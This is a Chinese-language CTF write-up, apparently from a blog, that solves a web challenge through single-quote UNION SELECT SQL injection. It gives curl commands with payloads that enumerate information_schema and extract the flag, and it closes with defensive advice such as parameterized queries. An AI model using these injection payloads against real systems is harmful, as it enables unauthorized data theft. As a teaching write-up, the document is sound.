---
title: 6-SQL注入-1
date: 2026-07-09
categories:
  - CTF
  - WEB
tags:
  - sql注入
---

# 1. 题目分析

- **目标 URL**：`https://xxx.http-ctf2.dasctf.com/index.php?id=1`
- **页面类型**：笔记（notes）应用，通过 `?id=` 参数显示不同笔记内容
- **技术栈**：OpenResty (Nginx) + PHP/5.5.9 + MariaDB/5.5.64

## HTTP 响应头关键信息

| 响应头 | 值 | 含义 |
|--------|-----|------|
| `Server` | `openresty` | Nginx 系 Web 中间件 |
| `X-Powered-By` | `PHP/5.5.9-1ubuntu4.29` | 后端 PHP 5.5.9（Ubuntu 14.04） |
| `Content-Type` | `text/html` | 标准 HTML 页面 |

# 2. 信息收集

## 2.1 页面功能分析

访问 `index.php?id=1`，页面显示一条标题为 "Happy" 的笔记。初步判断这是一个从数据库查询笔记的简单应用。

## 2.2 枚举 id 参数

```bash
# id=1 → 标题 "Happy"，正常显示
curl -s "TARGET/index.php?id=1"

# id=2 → 标题 "Learn something new"，正常显示
curl -s "TARGET/index.php?id=2"

# id=3 → 标题 "tips"，显示了一个调试提示
curl -s "TARGET/index.php?id=3"
```

id=3 的内容显示：`if too difficult, add &tips=1 to the url!`

## 2.3 调试模式

添加 `&tips=1` 参数后，页面直接输出了执行的 SQL 语句：

```
select * from notes where id ='1'
```

确认了：
- 参数 `id` 被**单引号包裹**拼接到 SQL 查询中
- 查询的表为 `notes`
![](assets/file-20260709221803129.png)
# 3. 漏洞分析

## 3.1 推理链

```
线索：?id=1 显示笔记，?id=2 显示另一条笔记
  ↓
假设：id 参数直接拼接到 SQL 查询中，存在 SQL 注入
  ↓
验证 id=1'：返回空白 → SQL 语法错误（引号不匹配），确认注入
  ↓
验证 id=1' order by 3--+：正常返回 → 注释符可用，至少 3 列
  ↓
验证 id=1' order by 4--+：空白 → 错误，确认只有 3 列
  ↓
验证 id=-1' union select 1,2,3--+：页面显示 2 和 3 → UNION 注入可用
  ↓
结论：单引号字符型 SQL 注入，UNION SELECT 注入点在第 2、3 列
```

## 3.2 注入类型判定

| 测试 Payload | URL 编码 | 结果 | 分析 |
|-------------|----------|------|------|
| `id=1` | — | 显示"Happy"笔记 | 正常查询 |
| `id=2-1` | — | 显示"Learn something new"（id=2） | 作为字符串 `'2-1'` → MySQL 转整数取 2 |
| `id=1'` | `id=1%27` | 空白输出 | 引号不匹配，SQL 语法错误 |
| `id=1' or 1=1--+` | `id=1%27%20or%201=1--+` | 显示 id=1 | 注释符有效 |
| `id=-1' union select 1,2,3--+` | URL 编码后 | 显示 2 和 3 | **UNION 注入确认** |

## 3.3 漏洞原理图解

```
后端 SQL 查询：
┌──────────────────────────────────────────────────┐
│ SELECT * FROM notes WHERE id ='用户输入'           │
└──────────────────────────────────────────────────┘

正常请求：?id=1
┌──────────────────────────────────────────────────┐
│ SELECT * FROM notes WHERE id ='1'                 │
│ → 返回 id=1 的笔记 ✅                              │
└──────────────────────────────────────────────────┘

注入攻击：?id=-1' union select 1,database(),3--+
┌──────────────────────────────────────────────────┐
│ SELECT * FROM notes WHERE id ='-1'                │
│ UNION                                            │
│ SELECT 1,database(),3--+'                        │
│ → id=-1 无匹配 + UNION 注入数据 ✅                  │
│ → database() 结果显示在标题位置                     │
└──────────────────────────────────────────────────┘
```

## 3.4 注入点映射

```
SELECT * FROM notes WHERE id='-1' UNION SELECT 1, 2, 3 -- '

列位 1: 不显示
列位 2: → <div class="header"> 此处 </div>（标题位置）
列位 3: → <p> 此处 </p>（内容位置）
```

# 4. 漏洞利用

## 4.1 获取数据库信息

```bash
# 获取数据库名和版本
curl -s "TARGET/index.php?id=-1' union select 1,database(),version()--+"
```
结果：数据库名 `note`，版本 `5.5.64-MariaDB-1ubuntu0.14.04.1`

## 4.2 获取表名

```bash
# 查询所有表名
curl -s "TARGET/index.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+"
```
结果：`fl4g, notes` — 发现 `fl4g` 表（目标表）
![](assets/file-20260709223137575.png)
## 4.3 获取列名

```bash
# 查询 fl4g 表的列名
curl -s "TARGET/index.php?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='fl4g'--+"
```
结果：`fllllag` — 只有一个列，名字很可疑

## 4.4 获取 Flag

```bash
# 读取 flag
curl -s "TARGET/index.php?id=-1' union select 1,fllllag,3 from fl4g--+"
```

# 5. Flag

```
n1book{union_select_is_so_cool}
```

直接从 `fl4g.fllllag` 列中通过 UNION SELECT 提取。

# 6. 知识点总结

## 6.1 技术要点

- **数字型 vs 字符型注入**：通过 `id=2-1` 返回 id=2 判断为字符型。`'2-1'` 在 MySQL 中转换为整数 2，而非计算 `2-1=1`
- **UNION SELECT 注入**：核心是利用 `information_schema` 信息收集 → 定位敏感表 → 提取数据
- **列数判断**：`ORDER BY N` 逐个测试，报错时列数即 N-1
- **显示位判定**：`UNION SELECT 1,2,3` 看哪几个数字回显在页面上

## 6.2 数据库结构

```
数据库: note
├── notes (id, title, content)  — 笔记表，3 列
└── fl4g (fllllag)              — flag 存储表，1 列
```

## 6.3 调试技巧

本题提供了 `tips=1` 参数，可以直接查看后端 SQL 语句，帮助确认注入类型和闭合方式。实际渗透中，手工判断闭合方式是基本功。

## 6.4 防御建议

- 使用参数化查询（Prepared Statements），杜绝 SQL 拼接
- 对输出进行编码，防止 XSS
- 生产环境移除调试参数（`tips=1`）
- 数据库用户遵循最小权限原则

# 7. 解题链路总结图

```
获取 HTTP 响应头
    ↓ X-Powered-By: PHP/5.5.9
确认 PHP 运行环境
    ↓
访问 ?id=1 → 显示笔记内容
    ↓ ?id=2 → 显示另一条笔记
确认数据库查询
    ↓
访问 ?id=3 → 发现 tips 提示
    ↓
添加 &tips=1 → 直接暴露 SQL 语句
    ↓ SELECT * FROM notes WHERE id='1'
确认单引号字符型注入
    ↓
id=1' order by 3--+ → 正常
id=1' order by 4--+ → 报错
    ↓
确认 3 列
    ↓
id=-1' union select 1,2,3--+ → 2、3 回显
确认 UNION 注入可行
    ↓
database() → 数据库名 note
    ↓
information_schema.tables → 表名 fl4g, notes
    ↓
information_schema.columns → 列名 fllllag
    ↓
SELECT fllllag FROM fl4g → n1book{union_select_is_so_cool}
```

# 8. 补充：数字型 vs 字符型注入详解

通过 `id=2-1` 返回 id=2 判断为字符型。`'2-1'` 在 MySQL 中转换为整数 2，而非计算 `2-1=1`，这句话是什么意思？

核心在于 PHP 的 `$_GET['id']` 拿到的永远是**字符串**，不是数字。

你在浏览器输入 `?id=2-1`，PHP 收到的不是 `1`，而是字符串 `"2-1"`。这个字符串拼进 SQL 后，有没有引号包裹，结果完全不同。

---

**如果没引号**（数字型注入）：

```sql
WHERE id = 2-1
```

MySQL 会把 `2-1` 当作**算术表达式**计算，得到 `1`，最终 `WHERE id = 1` → 返回 id=1 的笔记。

**如果有引号**（字符型注入）：

```sql
WHERE id = '2-1'
```

MySQL 拿字符串 `'2-1'` 去和整数列 `id` 比较，类型不一致，于是把字符串**强制转换成整数**。转换规则是：从第一个字符开始取，碰到非数字就停：

```
'2-1' → 2- → 2
```

最终变成 `WHERE id = 2` → 返回 id=2 的笔记。

---

**实际测试结果**：`id=2-1` 返回了 id=2 的笔记（"Learn something new"），说明走的是第二种情况，即 id 被单引号包裹，是**字符型注入**。
